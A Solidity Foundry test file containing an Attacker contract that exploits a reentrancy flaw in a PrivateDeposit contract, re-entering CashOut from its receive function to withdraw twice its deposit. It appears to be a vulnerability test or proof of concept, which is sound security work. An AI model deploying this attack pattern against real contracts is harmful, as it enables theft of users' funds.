
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {
    PrivateDeposit public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PrivateDeposit();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateDeposit public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackValue;

    constructor(address victimAddress) {
        victim = PrivateDeposit(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        storedAttackValue = val;
        victim.CashOut(val);
        
        uint256 finalVictimBalance = address(victim).balance;
        uint256 expectedReduction = storedAttackValue * 2;
        
        if (initialVictimBalance - finalVictimBalance == expectedReduction) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.CashOut(storedAttackValue);
        }
    }
}
